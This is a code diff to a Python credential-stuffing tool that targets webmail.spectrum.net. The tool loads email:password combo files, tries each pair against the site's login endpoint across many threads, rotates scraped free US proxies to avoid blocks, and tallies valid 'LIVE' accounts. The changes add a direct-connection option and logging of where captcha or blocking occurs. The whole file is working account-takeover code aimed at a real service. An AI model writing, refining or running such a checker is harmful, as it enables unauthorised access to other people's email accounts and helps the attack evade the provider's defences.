@@ -24,8 +24,6 @@ class ValosintChecker:
 
     def _display_banner(self):
         os.system('cls' if os.name == 'nt' else 'clear')
-        
-        # Logo besar warna Cyan
         print(f"{Fore.CYAN}██    ██  █████  ██       ██████  ███████ ██ ███    ██ ████████ ")
         print(f"{Fore.CYAN}██    ██ ██   ██ ██      ██    ██ ██      ██ ████   ██    ██    ")
         print(f"{Fore.CYAN}██    ██ ███████ ██      ██    ██ ███████ ██ ██ ██  ██    ██    ")
@@ -38,19 +36,16 @@ class ValosintChecker:
         print(f"                         {Fore.BLUE}╭──────────────╮")
         print(f"                         {Fore.CYAN}│ {Fore.WHITE}PROJECT_VALO {Fore.CYAN}│")
         print(f"                         {Fore.BLUE}╰──────────────╯")
-        
-        # Bagian Informasi Bot
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         print(f"{Fore.GREEN}Target      {Fore.WHITE}: webmail.spectrum.net")
         print(f"{Fore.GREEN}Admin       {Fore.WHITE}: valosint_admin")
-        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_v5")
-        print(f"{Fore.GREEN}Runtime     {Fore.WHITE}: Python + Termux")
+        print(f"{Fore.GREEN}Script Name {Fore.WHITE}: spectrum_checker_v5_DEBUG")
         print(f"{Fore.GREEN}Started At  {Fore.WHITE}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
 
     def _get_us_proxies(self):
         try:
-            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=US&ssl=all&anonymity=all"
+            url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=US&ssl=all&anonymity=all"
             res = requests.get(url, timeout=10)
             proxies = [line.strip() for line in res.text.splitlines() if line.strip()]
             return proxies
@@ -61,9 +56,10 @@ class ValosintChecker:
         if ":" not in credential: return
         email, password = credential.split(":")
         
-        # Menggunakan proxy jika tersedia
+        # Pengecekan apakah menggunakan proxy atau direct
         px = random.choice(proxies) if proxies else None
         px_map = {"http": f"http://{px}", "https": f"http://{px}"} if px else None
+        proxy_log = px if px else "Direct Connection"
         
         try:
             target_url = "https://webmail.spectrum.net/index.php/mail/auth"
@@ -108,41 +104,43 @@ class ValosintChecker:
                 with self.lock: self.bad_count += 1
             
             else:
-                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked/Captcha (Proxy: {px})")
+                # Jika nyangkut, kasih tau nyangkut di URL mana
+                print(f"{Fore.MAGENTA}[{ts}] [RETRY] {email} | Blocked at: {res.url[:40]}...")
                 with self.lock: self.error_count += 1
 
         except Exception as e:
-            # Jika proxy mati atau timeout
-            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Proxy Failed/Timeout")
+            # Jika timeout atau proxy mati
+            print(f"{Fore.YELLOW}[{self._get_time()}] [ERROR] {email} | Proxy Failed / Request Timeout")
             with self.lock: self.error_count += 1
 
     def start(self):
         self._display_banner()
 
-        # Input Interaktif
         combo_file = input(f"{Fore.WHITE}[?] Input Combo File [{Fore.CYAN}Enter for 'combo.txt'{Fore.WHITE}]: ").strip() or "combo.txt"
-        proxy_file = input(f"{Fore.WHITE}[?] Input Proxy File [{Fore.CYAN}Enter for Auto USA{Fore.WHITE}]   : ").strip()
+        
+        # Opsi Proxy baru
+        print(f"{Fore.WHITE}[?] Proxy Setup      [{Fore.CYAN}Enter=Auto USA | Type 'NO'=Without Proxy{Fore.WHITE}]")
+        proxy_file = input(f"{Fore.WHITE}    > ").strip()
+        
         thread_input = input(f"{Fore.WHITE}[?] Threads Amount   [{Fore.CYAN}Enter for 5{Fore.WHITE}]            : ").strip() or "5"
         threads = int(thread_input)
         
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         
-        # Cek File Combo
         print(f"{Fore.YELLOW}[*] {Fore.WHITE}Initializing checker system...")
-        time.sleep(0.5)
-        
         if not os.path.exists(combo_file):
             print(f"{Fore.RED}[!] {Fore.WHITE}System halt: Combo file '{combo_file}' not found.")
             return
             
         accounts = [l.strip() for l in open(combo_file, 'r', encoding='utf-8') if ":" in l]
         print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loading {len(accounts)} accounts from database...")
-        time.sleep(0.5)
 
-        # Penanganan Proxy
+        # Logika Proxy
         print(f"{Fore.YELLOW}[*] {Fore.WHITE}Configuring network environment...")
         proxies = []
-        if proxy_file and os.path.exists(proxy_file):
+        if proxy_file.upper() == 'NO':
+            print(f"{Fore.MAGENTA}[!] {Fore.WHITE}WARNING: Running WITHOUT Proxy (Direct IP Connection)")
+        elif proxy_file and os.path.exists(proxy_file):
             proxies = [l.strip() for l in open(proxy_file, 'r', encoding='utf-8')]
             print(f"{Fore.YELLOW}[*] {Fore.WHITE}Loaded {len(proxies)} custom proxies.")
         else:
@@ -150,25 +148,19 @@ class ValosintChecker:
             if proxies:
                 print(f"{Fore.YELLOW}[*] {Fore.WHITE}Scraped {len(proxies)} free USA proxies.")
             else:
-                print(f"{Fore.RED}[!] {Fore.WHITE}Failed to get free proxies. Running without proxy.")
+                print(f"{Fore.RED}[!] {Fore.WHITE}Failed to get free proxies. Running direct.")
 
-        time.sleep(0.5)
+        time.sleep(1)
         print(f"{Fore.GREEN}[√] {Fore.WHITE}Terminal interface ready.")
         print(f"{Fore.BLUE}──────────────────────────────────────────────────────────────────────\n")
         
         print(f"{Fore.GREEN}[√] CHECKER ONLINE")
         print(f"{Fore.WHITE}Press {Fore.MAGENTA}CTRL + C{Fore.WHITE} to stop the process.\n")
 
-        if not accounts:
-            print(f"{Fore.RED}[!] Database empty. Exiting.")
-            return
-
-        # Eksekusi Checker
         with ThreadPoolExecutor(max_workers=threads) as executor:
             for acc in accounts:
                 executor.submit(self.check_account, acc, proxies)
 
-        # Rangkuman Akhir
         print(f"\n{Fore.BLUE}──────────────────────────────────────────────────────────────────────")
         print(f"{Fore.GREEN} [+] TOTAL LIVE : {self.valid_count}")
         print(f"{Fore.RED} [-] TOTAL DD   : {self.bad_count}")
